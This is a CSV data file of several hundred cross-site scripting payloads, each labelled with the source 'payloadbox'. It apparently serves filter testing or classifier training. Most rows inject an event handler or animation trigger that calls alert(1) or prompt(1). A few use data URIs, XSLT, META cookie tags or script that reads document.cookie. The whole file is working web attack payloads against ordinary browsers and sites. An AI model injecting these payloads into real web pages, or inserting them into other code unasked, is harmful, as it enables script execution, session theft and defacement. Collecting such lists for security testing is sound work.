text,source
<q id=x tabindex=1 onfocus=alert(1)></q>,payloadbox
"<details onmouseover=""alert(1)"">test</details>",payloadbox
"<style>:target {color:red;}</style><bdo id=x style=""transition:color 1s"" ontransitionend=alert(1)></bdo>",payloadbox
"<h1 onbeforecut=""alert(1)"" contenteditable>test</h1>",payloadbox
"<cite onmouseleave=""alert(1)"">test</cite>",payloadbox
"<ul draggable=""true"" ondragstart=""alert(1)"">test</ul>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><cite id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></cite>",payloadbox
top[8680439..toString(30)](1),payloadbox
"<object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""alert(126)"" style=""behavior:url(#x);""><param name=postdomevents /></object>//[""'`-->]]>]</div>",payloadbox
"<style>@keyframes x{}</style><table style=""animation-name:x"" onanimationend=""alert(1)""></table>",payloadbox
"<style>:target {color: red;}</style><xmp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></xmp>",payloadbox
"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",payloadbox
"<style>:target {color: red;}</style><select id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></select>",payloadbox
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",payloadbox
<img src/onerror=prompt(8)>,payloadbox
"<style>@keyframes slidein {}</style><fieldset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></fieldset>",payloadbox
"<datalist oncontextmenu=""alert(1)"">test</datalist>",payloadbox
"<map onmouseup=""alert(1)"">test</map>",payloadbox
"<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//[""'`-->]]>]</div>",payloadbox
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>,payloadbox
"<menuitem onmouseenter=""alert(1)"">test</menuitem>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable>drop here</colgroup>",payloadbox
<mark id=x tabindex=1 onfocusin=alert(1)></mark>,payloadbox
"<rp oncopy=""alert(1)"" contenteditable>test</rp>",payloadbox
"<listing draggable=""true"" ondragleave=""alert(1)"">test</listing>",payloadbox
<b id=x tabindex=1 onfocusin=alert(1)></b>,payloadbox
"<dir onbeforepaste=""alert(1)"" contenteditable>test</dir>",payloadbox
"<rp draggable=""true"" ondragleave=""alert(1)"">test</rp>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable>drop here</abbr>",payloadbox
"<code onpaste=""alert(1)"" contenteditable>test</code>",payloadbox
"<plaintext draggable=""true"" ondragstart=""alert(1)"">test</plaintext>",payloadbox
"<source oncopy=""alert(1)"" contenteditable>test</source>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable>drop here</xmp>",payloadbox
"<nobr oncopy=""alert(1)"" contenteditable>test</nobr>",payloadbox
"<base onbeforecut=""alert(1)"" contenteditable>test</base>",payloadbox
<noframes id=x tabindex=1 onfocusin=alert(1)></noframes>,payloadbox
"<ruby onkeyup=""alert(1)"" contenteditable>test</ruby>",payloadbox
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationstart=""alert(1)""></s>",payloadbox
<textarea oncut=alert(1) autofocus>XSS</textarea>,payloadbox
"<blockquote draggable=""true"" ondragleave=""alert(1)"">test</blockquote>",payloadbox
"<style>@keyframes x{}</style><head style=""animation-name:x"" onanimationend=""alert(1)""></head>",payloadbox
<object id=x onfocus=alert(1) type=text/html>,payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frameset>",payloadbox
"<style>:target {color:red;}</style><audio id=x style=""transition:color 1s"" ontransitionend=alert(1)></audio>",payloadbox
"<code oncopy=""alert(1)"" contenteditable>test</code>",payloadbox
"<var onmouseover=""prompt(1)"">On Mouse Over</var>?",payloadbox
<video id=x tabindex=1 onactivate=alert(1)></video>,payloadbox
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onanimationstart=""alert(1)""></summary>",payloadbox
<dd id=x tabindex=1 onactivate=alert(1)></dd>,payloadbox
"<style>:target {color:red;}</style><div id=x style=""transition:color 1s"" ontransitionend=alert(1)></div>",payloadbox
"<caption oncut=""alert(1)"" contenteditable>test</caption>",payloadbox
"<font onbeforecopy=""alert(1)"" contenteditable>test</font>",payloadbox
<th id=x tabindex=1 onactivate=alert(1)></th>,payloadbox
"</html>//[""'`-->]]>]</div>",payloadbox
"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>?",payloadbox
"<noframes onmouseover=""alert(1)"">test</noframes>",payloadbox
"<set attributeName=""xlink:href"" begin=""accessKey(a)"" to=""//example.com/?a"" />",payloadbox
<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>,payloadbox
"<html draggable=""true"" ondragstart=""alert(1)"">test</html>",payloadbox
<link id=x tabindex=1 onactivate=alert(1)></link>,payloadbox
"<style>:target {transform: rotate(180deg);}</style><bdi id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bdi>",payloadbox
"<del draggable=""true"" ondragstart=""alert(1)"">test</del>",payloadbox
"<style>@keyframes x{}</style><optgroup style=""animation-name:x"" onanimationstart=""alert(1)""></optgroup>",payloadbox
"<style>:target {color: red;}</style><acronym id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></acronym>",payloadbox
"<colgroup onmouseenter=""alert(1)"">test</colgroup>",payloadbox
<iframe/src \/\/onload = prompt(1),payloadbox
<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>,payloadbox
"<cite onpaste=""alert(1)"" contenteditable>test</cite>",payloadbox
"<section oncopy=""alert(1)"" contenteditable>test</section>",payloadbox
"<figure onbeforepaste=""alert(1)"" contenteditable>test</figure>",payloadbox
"<details oncopy=""alert(1)"" contenteditable>test</details>",payloadbox
"<bgsound onclick=""alert(1)"">test</bgsound>",payloadbox
<dt id=x tabindex=1 onfocusin=alert(1)></dt>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>",payloadbox
<header onblur=alert(1) tabindex=1 id=x></header><input autofocus>,payloadbox
"<plaintext ondblclick=""alert(1)"">test</plaintext>",payloadbox
"<video onpaste=""alert(1)"" contenteditable>test</video>",payloadbox
"<var onbeforecut=""alert(1)"" contenteditable>test</var>",payloadbox
"<nobr onkeypress=""alert(1)"" contenteditable>test</nobr>",payloadbox
"<noembed draggable=""true"" ondragstart=""alert(1)"">test</noembed>",payloadbox
"<video onclick=""alert(1)"">test</video>",payloadbox
"<bdo draggable=""true"" ondragleave=""alert(1)"">test</bdo>",payloadbox
<svg contentScriptType=text/vbs><script>MsgBox+1,payloadbox
"<tr oncopy=""alert(1)"" contenteditable>test</tr>",payloadbox
"<tfoot draggable=""true"" ondragstart=""alert(1)"">test</tfoot>",payloadbox
"<address onmouseout=""alert(1)"">test</address>",payloadbox
"<bgsound onmouseenter=""alert(1)"">test</bgsound>",payloadbox
"<multicol onkeydown=""alert(1)"" contenteditable>test</multicol>",payloadbox
"<p ondblclick=""alert(1)"">test</p>",payloadbox
"<?xml-stylesheet type=""text/xsl"" href=""data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E""?>",payloadbox
<svg><th onload=alert(1)></th>,payloadbox
"<style>:target {color: red;}</style><kbd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></kbd>",payloadbox
"<frameset onmousedown=""alert(1)"">test</frameset>",payloadbox
"<noembed onmouseout=""alert(1)"">test</noembed>",payloadbox
<ruby id=x tabindex=1 onfocus=alert(1)></ruby>,payloadbox
"<hr onmouseenter=""alert(1)"">test</hr>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><col id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></col>",payloadbox
<img src =q onerror=prompt(8)>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><li ondrop=alert(1) contenteditable>drop here</li>",payloadbox
"<iframe oncontextmenu=""alert(1)"">test</iframe>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><marquee id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></marquee>",payloadbox
<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>,payloadbox
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",payloadbox
"<basefont oncopy=""alert(1)"" contenteditable>test</basefont>",payloadbox
<pre id=x tabindex=1 onfocusin=alert(1)></pre>,payloadbox
"<menu onmouseleave=""alert(1)"">test</menu>",payloadbox
"<basefont onkeydown=""alert(1)"" contenteditable>test</basefont>",payloadbox
<rp id=x tabindex=1 onactivate=alert(1)></rp>,payloadbox
"<style>@keyframes slidein {}</style><blink style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></blink>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><applet ondragover=alert(1) contenteditable>drop here</applet>",payloadbox
"<td onbeforecopy=""alert(1)"" contenteditable>test</td>",payloadbox
<form>,payloadbox
"<style>:target {transform: rotate(180deg);}</style><time id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></time>",payloadbox
"<dl onbeforecut=""alert(1)"" contenteditable>test</dl>",payloadbox
"<cite oncut=""alert(1)"" contenteditable>test</cite>",payloadbox
<p id=x tabindex=1 onbeforeactivate=alert(1)></p>,payloadbox
<frame onblur=alert(1) tabindex=1 id=x></frame><input autofocus>,payloadbox
"<a onbeforepaste=""alert(1)"" contenteditable>test</a>",payloadbox
"<article oncontextmenu=""alert(1)"">test</article>",payloadbox
"<video autoplay onplay=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",payloadbox
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,payloadbox
"<marquee onkeyup=""alert(1)"" contenteditable>test</marquee>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><listing id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></listing>",payloadbox
"<big onmouseenter=""alert(1)"">test</big>",payloadbox
<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>,payloadbox
"<area draggable=""true"" ondrag=""alert(1)"">test</area>",payloadbox
"<style>@keyframes slidein {}</style><mark style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></mark>",payloadbox
<iframe id=x tabindex=1 onactivate=alert(1)></iframe>,payloadbox
"<figure draggable=""true"" ondragend=""alert(1)"">test</figure>",payloadbox
"<output onbeforecut=""alert(1)"" contenteditable>test</output>",payloadbox
"<progress onmouseenter=""alert(1)"">test</progress>",payloadbox
<details id=x tabindex=1 onfocus=alert(1)></details>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><object ondragover=alert(1) contenteditable>drop here</object>",payloadbox
"<source onbeforecut=""alert(1)"" contenteditable>test</source>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figure id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figure>",payloadbox
<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>,payloadbox
"<caption onkeydown=""alert(1)"" contenteditable>test</caption>",payloadbox
\'-alert(1)//,payloadbox
"<caption onmouseleave=""alert(1)"">test</caption>",payloadbox
"<abbr onmouseup=""alert(1)"">test</abbr>",payloadbox
<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>,payloadbox
<img id=x tabindex=1 onfocusin=alert(1)></img>,payloadbox
<option id=x tabindex=1 onbeforeactivate=alert(1)></option>,payloadbox
<script id=x tabindex=1 onfocusin=alert(1)></script>,payloadbox
"<svg draggable=""true"" ondragstart=""alert(1)"">test</svg>",payloadbox
"<bdi onbeforecut=""alert(1)"" contenteditable>test</bdi>",payloadbox
<nextid onfocusout=alert(1) tabindex=1 id=x></nextid><input autofocus>,payloadbox
<form><input oninvalid=alert(1) required><input type=submit>,payloadbox
"<figcaption onpaste=""alert(1)"" contenteditable>test</figcaption>",payloadbox
"<bgsound onmouseup=""alert(1)"">test</bgsound>",payloadbox
"<video draggable=""true"" ondrag=""alert(1)"">test</video>",payloadbox
"""><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",payloadbox
"<meter onbeforepaste=""alert(1)"" contenteditable>test</meter>",payloadbox
<dl id=x tabindex=1 onfocus=alert(1)></dl>,payloadbox
"<svg><script xlink:href=data:,alert(1) />",payloadbox
"<nobr oncut=""alert(1)"" contenteditable>test</nobr>",payloadbox
"<center onbeforecut=""alert(1)"" contenteditable>test</center>",payloadbox
"<figure onkeyup=""alert(1)"" contenteditable>test</figure>",payloadbox
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"">",payloadbox
'-prompt(8)-',payloadbox
<var id=x tabindex=1 onbeforedeactivate=alert(1)></var><input autofocus>,payloadbox
"<li oncut=""alert(1)"" contenteditable>test</li>",payloadbox
"<nav onmouseenter=""alert(1)"">test</nav>",payloadbox
"<rt onkeydown=""alert(1)"" contenteditable>test</rt>",payloadbox
"<acronym draggable=""true"" ondragstart=""alert(1)"">test</acronym>",payloadbox
"<br draggable=""true"" ondragend=""alert(1)"">test</br>",payloadbox
"<param oncopy=""alert(1)"" contenteditable>test</param>",payloadbox
"<form onkeydown=""alert(1)"" contenteditable>test</form>",payloadbox
<svg><animatetransform onbegin=alert(1) attributeName=transform>,payloadbox
"<xmp draggable=""true"" ondragenter=""alert(1)"">test</xmp>",payloadbox
<span id=x tabindex=1 onbeforeactivate=alert(1)></span>,payloadbox
"<rtc onclick=""alert(1)"">test</rtc>",payloadbox
"<bdo onbeforecopy=""alert(1)"" contenteditable>test</bdo>",payloadbox
<br><br><br><br><br><br><x id=x>#x,payloadbox
"<dt onpaste=""alert(1)"" contenteditable>test</dt>",payloadbox
"<fieldset onbeforepaste=""alert(1)"" contenteditable>test</fieldset>",payloadbox
"<noframes draggable=""true"" ondragstart=""alert(1)"">test</noframes>",payloadbox
"<basefont oncut=""alert(1)"" contenteditable>test</basefont>",payloadbox
<menu onblur=alert(1) tabindex=1 id=x></menu><input autofocus>,payloadbox
"<style>:target {color:red;}</style><element id=x style=""transition:color 1s"" ontransitionend=alert(1)></element>",payloadbox
"<template draggable=""true"" ondragleave=""alert(1)"">test</template>",payloadbox
"<var ondblclick=""alert(1)"">test</var>",payloadbox
"<cite onkeypress=""alert(1)"" contenteditable>test</cite>",payloadbox
"<META HTTP-EQUIV=""Link"" Content=""<javascript:alert('XSS')>; REL=stylesheet"">",payloadbox
<progress onfocusout=alert(1) tabindex=1 id=x></progress><input autofocus>,payloadbox
"<colgroup oncopy=""alert(1)"" contenteditable>test</colgroup>",payloadbox
"<optgroup onmouseover=""alert(1)"">test</optgroup>",payloadbox
"<q onpaste=""alert(1)"" contenteditable>test</q>",payloadbox
"<th onmousedown=""alert(1)"">test</th>",payloadbox
"<set attributeName=""xlink:href"" begin=""accessKey(d)"" to=""//example.com/?d"" />",payloadbox
"<style>@keyframes x{}</style><option style=""animation-name:x"" onanimationend=""alert(1)""></option>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><slot ondrop=alert(1) contenteditable>drop here</slot>",payloadbox
"<pre onmouseover=""alert(1)"">test</pre>",payloadbox
<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>,payloadbox
"<meter onmouseout=""alert(1)"">test</meter>",payloadbox
"<font onkeypress=""alert(1)"" contenteditable>test</font>",payloadbox
"<pre oncopy=""alert(1)"" contenteditable>test</pre>",payloadbox
"<center onmouseout=""alert(1)"">test</center>",payloadbox
<td id=x tabindex=1 onbeforeactivate=alert(1)></td>,payloadbox
<div onblur=alert(1) tabindex=1 id=x></div><input autofocus>,payloadbox
"<span oncut=""alert(1)"" contenteditable>test</span>",payloadbox
"</svg>//[""'`-->]]>]</div>",payloadbox
"<source ondblclick=""alert(1)"">test</source>",payloadbox
"<code ondblclick=""alert(1)"">test</code>",payloadbox
"<mark onpaste=""alert(1)"" contenteditable>test</mark>",payloadbox
<rtc id=x tabindex=1 onactivate=alert(1)></rtc>,payloadbox
<template id=x tabindex=1 onbeforeactivate=alert(1)></template>,payloadbox
"<nav draggable=""true"" ondragend=""alert(1)"">test</nav>",payloadbox
"<nextid onpaste=""alert(1)"" contenteditable>test</nextid>",payloadbox
"<em onmousemove=""alert(1)"">test</em>",payloadbox
"<content draggable=""true"" ondragend=""alert(1)"">test</content>",payloadbox
"<map onbeforecopy=""alert(1)"" contenteditable>test</map>",payloadbox
"<ol onkeyup=""alert(1)"" contenteditable>test</ol>",payloadbox
<x onmouseover=alert(1)>hover this!,payloadbox
"<xsl:stylesheet id=""stylesheet"" version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">        <xsl:template match=""/""><iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""javascript:alert(125)""></iframe>        </xsl:template></xsl:stylesheet><circle fill=""red"" r=""40""></circle></svg>//[""'`-->]]>]</div>",payloadbox
<optgroup id=x tabindex=1 onactivate=alert(1)></optgroup>,payloadbox
<img id=x tabindex=1 ondeactivate=alert(1)></img><input id=y autofocus>,payloadbox
"<style>@keyframes x{}</style><caption style=""animation-name:x"" onanimationend=""alert(1)""></caption>",payloadbox
"<summary onpaste=""alert(1)"" contenteditable>test</summary>",payloadbox
"<style>@keyframes slidein {}</style><plaintext style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></plaintext>",payloadbox
"<blink oncut=""alert(1)"" contenteditable>test</blink>",payloadbox
"<style>@keyframes slidein {}</style><nobr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nobr>",payloadbox
"<iframe draggable=""true"" ondragstart=""alert(1)"">test</iframe>",payloadbox
"exp/*<XSS STYLE='no\xss:noxss(""*//*"");",payloadbox
"<style>:target {color:red;}</style><var id=x style=""transition:color 1s"" ontransitionend=alert(1)></var>",payloadbox
"<link ondblclick=""alert(1)"">test</link>",payloadbox
<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>,payloadbox
<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>,payloadbox
"<applet draggable=""true"" ondragstart=""alert(1)"">test</applet>",payloadbox
"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationstart=""alert(1)""></em>",payloadbox
<iframe onreadystatechange=alert(1)></iframe>,payloadbox
"<bdi onpaste=""alert(1)"" contenteditable>test</bdi>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable>drop here</cite>",payloadbox
<sup id=x tabindex=1 onactivate=alert(1)></sup>,payloadbox
<svg><colgroup onload=alert(1)></colgroup>,payloadbox
<col id=x tabindex=1 onbeforeactivate=alert(1)></col>,payloadbox
"<style>:target {color:red;}</style><small id=x style=""transition:color 1s"" ontransitionend=alert(1)></small>",payloadbox
<frame id=x tabindex=1 onactivate=alert(1)></frame>,payloadbox
<data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>,payloadbox
"<summary onmouseout=""alert(1)"">test</summary>",payloadbox
"<applet onkeydown=""alert(1)"" contenteditable>test</applet>",payloadbox
<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>,payloadbox
"<select onmouseover=""alert(1)"">test</select>",payloadbox
"<rt draggable=""true"" ondrag=""alert(1)"">test</rt>",payloadbox
"<li oncopy=""alert(1)"" contenteditable>test</li>",payloadbox
"<style>@keyframes x{}</style><marquee style=""animation-name:x"" onanimationstart=""alert(1)""></marquee>",payloadbox
<main id=x tabindex=1 onbeforedeactivate=alert(1)></main><input autofocus>,payloadbox
"<bdi oncontextmenu=""alert(1)"">test</bdi>",payloadbox
"<style>@keyframes slidein {}</style><meter style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></meter>",payloadbox
<input id=x tabindex=1 onactivate=alert(1)></input>,payloadbox
"<rp onmouseover=""alert(1)"">test</rp>",payloadbox
"<style onmouseout=""alert(1)"">test</style>",payloadbox
<keygen autofocus onfocus=alert(1)>,payloadbox
"<article onmouseleave=""alert(1)"">test</article>",payloadbox
"<dl draggable=""true"" ondragstart=""alert(1)"">test</dl>",payloadbox
<h1 onblur=alert(1) tabindex=1 id=x></h1><input autofocus>,payloadbox
"<noframes ondblclick=""alert(1)"">test</noframes>",payloadbox
"<image draggable=""true"" ondrag=""alert(1)"">test</image>",payloadbox
"<style>:target {color: red;}</style><button id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></button>",payloadbox
"<dfn onkeypress=""alert(1)"" contenteditable>test</dfn>",payloadbox
"<script onmousemove=""alert(1)"">test</script>",payloadbox
"<xmp onpaste=""alert(1)"" contenteditable>test</xmp>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><rtc ondrop=alert(1) contenteditable>drop here</rtc>",payloadbox
<head id=x tabindex=1 onactivate=alert(1)></head>,payloadbox
"<image onbeforepaste=""alert(1)"" contenteditable>test</image>",payloadbox
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",payloadbox
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationend=""alert(1)""></style>",payloadbox
"<style>@keyframes x{}</style><details style=""animation-name:x"" onanimationstart=""alert(1)""></details>",payloadbox
"<slot draggable=""true"" ondragleave=""alert(1)"">test</slot>",payloadbox
"<meta onmousedown=""alert(1)"">test</meta>",payloadbox
"<sub onbeforecut=""alert(1)"" contenteditable>test</sub>",payloadbox
"<select draggable=""true"" ondragenter=""alert(1)"">test</select>",payloadbox
"<sup onkeyup=""alert(1)"" contenteditable>test</sup>",payloadbox
"<spacer draggable=""true"" ondragstart=""alert(1)"">test</spacer>",payloadbox
<code id=x tabindex=1 onactivate=alert(1)></code>,payloadbox
"<cite oncopy=""alert(1)"" contenteditable>test</cite>",payloadbox
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationstart=""alert(1)""></audio>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><tfoot ondragover=alert(1) contenteditable>drop here</tfoot>",payloadbox
"<dfn draggable=""true"" ondrag=""alert(1)"">test</dfn>",payloadbox
"<dir onmouseleave=""alert(1)"">test</dir>",payloadbox
<figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus>,payloadbox
"<style>:target {transform: rotate(180deg);}</style><rtc id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></rtc>",payloadbox
"<caption ondblclick=""alert(1)"">test</caption>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><body id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></body>",payloadbox
"<input draggable=""true"" ondragstart=""alert(1)"">test</input>",payloadbox
"<figcaption ondblclick=""alert(1)"">test</figcaption>",payloadbox
"<link draggable=""true"" ondragenter=""alert(1)"">test</link>",payloadbox
"<blockquote onmouseleave=""alert(1)"">test</blockquote>",payloadbox
"<em draggable=""true"" ondrag=""alert(1)"">test</em>",payloadbox
<s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>,payloadbox
"<![><img src=""]><img src=x onerror=alert(39)//"">",payloadbox
"<center onpaste=""alert(1)"" contenteditable>test</center>",payloadbox
"<hr onbeforecut=""alert(1)"" contenteditable>test</hr>",payloadbox
"<button onclick=""alert(1)"">test</button>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><abbr ondrop=alert(1) contenteditable>drop here</abbr>",payloadbox
"<plaintext onclick=""alert(1)"">test</plaintext>",payloadbox
<svg><base onload=alert(1)></base>,payloadbox
"<textarea draggable=""true"" ondragstart=""alert(1)"">test</textarea>",payloadbox
<fieldset id=x tabindex=1 onbeforeactivate=alert(1)></fieldset>,payloadbox
"<br onmouseover=""alert(1)"">test</br>",payloadbox
"<style>@keyframes slidein {}</style><optgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></optgroup>",payloadbox
"<style>:target {color:red;}</style><input id=x style=""transition:color 1s"" ontransitionend=alert(1)></input>",payloadbox
"<keygen onmouseleave=""alert(1)"">test</keygen>",payloadbox
"<style>:target {color: red;}</style><progress id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></progress>",payloadbox
"<a draggable=""true"" ondrag=""alert(1)"">test</a>",payloadbox
"<div id=""95""><svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",payloadbox
"<form onbeforecopy=""alert(1)"" contenteditable>test</form>",payloadbox
"<datalist draggable=""true"" ondragstart=""alert(1)"">test</datalist>",payloadbox
"<form onmouseout=""alert(1)"">test</form>",payloadbox
"<rt ondblclick=""alert(1)"">test</rt>",payloadbox
"<style>:target {color:red;}</style><address id=x style=""transition:color 1s"" ontransitionend=alert(1)></address>",payloadbox
"<output onclick=""alert(1)"">test</output>",payloadbox
"<style>:target {color: red;}</style><link id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></link>",payloadbox
<element id=x tabindex=1 onbeforedeactivate=alert(1)></element><input autofocus>,payloadbox
"<picture draggable=""true"" ondrag=""alert(1)"">test</picture>",payloadbox
"<address onmouseup=""alert(1)"">test</address>",payloadbox
<form id=x tabindex=1 onfocusin=alert(1)></form>,payloadbox
<ruby id=x tabindex=1 onactivate=alert(1)></ruby>,payloadbox
"<style>:target {color: red;}</style><hgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></hgroup>",payloadbox
<bdi id=x tabindex=1 onactivate=alert(1)></bdi>,payloadbox
"<noframes onkeydown=""alert(1)"" contenteditable>test</noframes>",payloadbox
"<center onclick=""alert(1)"">test</center>",payloadbox
"<style onkeydown=""alert(1)"" contenteditable>test</style>",payloadbox
"<menuitem ondblclick=""alert(1)"">test</menuitem>",payloadbox
alert&#x28;1&#x29,payloadbox
"<label onmouseover=""alert(1)"">test</label>",payloadbox
"<noframes draggable=""true"" ondragleave=""alert(1)"">test</noframes>",payloadbox
"<svg onbeforepaste=""alert(1)"" contenteditable>test</svg>",payloadbox
<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable>drop here</dt>",payloadbox
"<style>:target {color:red;}</style><kbd id=x style=""transition:color 1s"" ontransitionend=alert(1)></kbd>",payloadbox
<meter onblur=alert(1) tabindex=1 id=x></meter><input autofocus>,payloadbox
<image srcset=1 onerror=alert(1)>,payloadbox
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationend=""alert(1)""></embed>",payloadbox
<object id=x tabindex=1 onbeforeactivate=alert(1)></object>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><html ondragover=alert(1) contenteditable>drop here</html>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><label ondrop=alert(1) contenteditable>drop here</label>",payloadbox
<strong id=x tabindex=1 onbeforedeactivate=alert(1)></strong><input autofocus>,payloadbox
"<style>:target {color: red;}</style><wbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></wbr>",payloadbox
